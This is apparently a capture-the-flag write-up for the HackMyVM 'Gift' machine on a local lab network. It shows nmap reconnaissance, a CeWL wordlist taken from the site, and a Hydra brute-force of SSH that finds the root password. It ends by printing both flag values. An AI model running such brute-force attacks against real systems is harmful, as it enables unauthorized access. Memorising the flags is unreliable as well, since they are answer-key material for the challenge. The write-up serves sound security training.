| Name | Difficulty | OS    | Target IP     | Link                                             |
| ---- | ---------- | ----- | ------------- | ------------------------------------------------ |
| Gift | Easy       | Linux | 192.168.0.118 | https://hackmyvm.eu/machines/machine.php?vm=Gift |
### ARP Scan

```bash
garffff@garffff:~/hackmyvm/gift$ sudo arp-scan -l | grep 4a          
192.168.0.118	08:00:27:fc:2f:4a	PCS Systemtechnik GmbH
```

### Nmap Scan Results

```bash
garffff@garffff:~/hackmyvm/gift$ sudo nmap -p- -sV -sC 192.168.0.118 -oA nmap/gift.tcp
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-31 17:37 BST
Nmap scan report for 192.168.0.118
Host is up (0.000060s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:FC:2F:4A (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
```

## Exploring port 80

Not much to see here:

![[Pasted image 20240731173904.png]]

Viewing the source:

![[Pasted image 20240731173923.png]]

I used Cewl to generate a word list from the words found on the site:

```bash
garffff@garffff:~/hackmyvm/gift$ cewl http://192.168.0.118 -w pass.txt
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
garffff@garffff:~/hackmyvm/gift$ cat pass.txt 
Dont
Overthink
Really
Its
simple
Trust
```

Using Hydra, I will attempt to brute force the SSH port:

```bash
garffff@garffff:~/hackmyvm/gift$ hydra -L pass.txt -P pass.txt 192.168.0.118 ssh -V
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-31 17:40:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
[DATA] attacking ssh://192.168.0.118:22/
[ATTEMPT] target 192.168.0.118 - login "Dont" - pass "Dont" - 1 of 36 [child 0] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Dont" - pass "Overthink" - 2 of 36 [child 1] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Dont" - pass "Really" - 3 of 36 [child 2] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Dont" - pass "Its" - 4 of 36 [child 3] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Dont" - pass "simple" - 5 of 36 [child 4] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Dont" - pass "Trust" - 6 of 36 [child 5] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Overthink" - pass "Dont" - 7 of 36 [child 6] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Overthink" - pass "Overthink" - 8 of 36 [child 7] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Overthink" - pass "Really" - 9 of 36 [child 8] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Overthink" - pass "Its" - 10 of 36 [child 9] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Overthink" - pass "simple" - 11 of 36 [child 10] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Overthink" - pass "Trust" - 12 of 36 [child 11] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Really" - pass "Dont" - 13 of 36 [child 12] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Really" - pass "Overthink" - 14 of 36 [child 13] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Really" - pass "Really" - 15 of 36 [child 14] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Really" - pass "Its" - 16 of 36 [child 15] (0/0)
[ATTEMPT] target 192.168.0.118 - login "Really" - pass "simple" - 17 of 38 [child 8] (0/2)
[ATTEMPT] target 192.168.0.118 - login "Really" - pass "Trust" - 18 of 38 [child 12] (0/2)
[ATTEMPT] target 192.168.0.118 - login "Its" - pass "Dont" - 19 of 39 [child 10] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Its" - pass "Overthink" - 20 of 39 [child 1] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Its" - pass "Really" - 21 of 39 [child 8] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Its" - pass "Its" - 22 of 39 [child 9] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Its" - pass "simple" - 23 of 39 [child 11] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Its" - pass "Trust" - 24 of 39 [child 4] (0/3)
[ATTEMPT] target 192.168.0.118 - login "simple" - pass "Dont" - 25 of 39 [child 2] (0/3)
[ATTEMPT] target 192.168.0.118 - login "simple" - pass "Overthink" - 26 of 39 [child 3] (0/3)
[RE-ATTEMPT] target 192.168.0.118 - login "simple" - pass "Dont" - 26 of 39 [child 10] (0/3)
[ATTEMPT] target 192.168.0.118 - login "simple" - pass "Really" - 27 of 39 [child 14] (0/3)
[ATTEMPT] target 192.168.0.118 - login "simple" - pass "Its" - 28 of 39 [child 13] (0/3)
[ATTEMPT] target 192.168.0.118 - login "simple" - pass "simple" - 29 of 39 [child 15] (0/3)
[RE-ATTEMPT] target 192.168.0.118 - login "simple" - pass "Overthink" - 29 of 39 [child 1] (0/3)
[RE-ATTEMPT] target 192.168.0.118 - login "simple" - pass "Its" - 29 of 39 [child 9] (0/3)
[ATTEMPT] target 192.168.0.118 - login "simple" - pass "Trust" - 30 of 39 [child 6] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Dont" - 31 of 39 [child 7] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Overthink" - 32 of 39 [child 12] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Really" - 33 of 39 [child 0] (0/3)
[RE-ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Trust" - 33 of 39 [child 6] (0/3)
[RE-ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Overthink" - 33 of 39 [child 12] (0/3)
[RE-ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Really" - 33 of 39 [child 0] (0/3)
[RE-ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Trust" - 33 of 39 [child 6] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Its" - 34 of 39 [child 5] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Trust" - pass "simple" - 35 of 39 [child 10] (0/3)
[ATTEMPT] target 192.168.0.118 - login "Trust" - pass "Trust" - 36 of 39 [child 14] (0/3)
[REDO-ATTEMPT] target 192.168.0.118 - login "Overthink" - pass "Really" - 37 of 39 [child 3] (1/3)
[REDO-ATTEMPT] target 192.168.0.118 - login "Really" - pass "Dont" - 38 of 39 [child 4] (2/3)
[REDO-ATTEMPT] target 192.168.0.118 - login "Really" - pass "simple" - 39 of 39 [child 8] (3/3)
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-31 17:40:54
```

No match. I will try the root user instead against the pass.txt file

```bash
garffff@garffff:~/hackmyvm/gift$ hydra -l root -P pass.txt 192.168.0.118 ssh -V
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-31 17:41:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking ssh://192.168.0.118:22/
[ATTEMPT] target 192.168.0.118 - login "root" - pass "Dont" - 1 of 7 [child 0] (0/0)
[ATTEMPT] target 192.168.0.118 - login "root" - pass "Overthink" - 2 of 7 [child 1] (0/0)
[ATTEMPT] target 192.168.0.118 - login "root" - pass "Really" - 3 of 7 [child 2] (0/0)
[ATTEMPT] target 192.168.0.118 - login "root" - pass "Its" - 4 of 7 [child 3] (0/0)
[ATTEMPT] target 192.168.0.118 - login "root" - pass "simple" - 5 of 7 [child 4] (0/0)
[ATTEMPT] target 192.168.0.118 - login "root" - pass "Trust" - 6 of 7 [child 5] (0/0)
[ATTEMPT] target 192.168.0.118 - login "root" - pass "root" - 7 of 7 [child 6] (0/0)
[22][ssh] host: 192.168.0.118   login: root   password: simple
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-31 17:41:59
```

A match is found:

```bash
root:simple
```

### Logging into SSH and Grabbing the Flags:

```bash
garffff@garffff:~/hackmyvm/gift$ ssh root@192.168.0.118
The authenticity of host '192.168.0.118 (192.168.0.118)' can't be established.
ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.118' (ED25519) to the list of known hosts.
root@192.168.0.118's password: 
IM AN SSH SERVER
gift:~# ls -lash
total 20K    
     4 drwx------    2 root     root        4.0K Sep 24  2020 .
     4 drwxr-xr-x   22 root     root        4.0K Sep 18  2020 ..
     4 -rw-------    1 root     root          18 Jul 31 16:43 .ash_history
     4 ----------    1 root     root          12 Sep 24  2020 root.txt
     4 -rw-rw----    1 root     root          12 Sep 24  2020 user.txt
gift:~# cat user.txt 
HMV665sXzDS
gift:~# cat root.txt 
HMVtyr543FG
```



